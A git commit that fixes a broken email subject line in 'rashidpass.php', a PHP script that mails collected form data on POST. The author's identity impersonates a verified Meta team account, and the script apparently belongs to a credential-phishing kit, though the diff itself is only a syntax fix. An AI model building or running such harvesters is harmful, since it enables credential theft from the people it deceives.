ebcb083d2175fa195515ec499bf316513ba4c3de
officialmetateamverified <official.meta.team.verified.here@gmail.com>
2025-07-28 02:42:54 +0800

    Update rashidpass.php

--- rashidpass.php
+++ rashidpass.php
@@ -42,7 +42,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'RASHID
+        $mail->Subject = 'RASHID';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
 
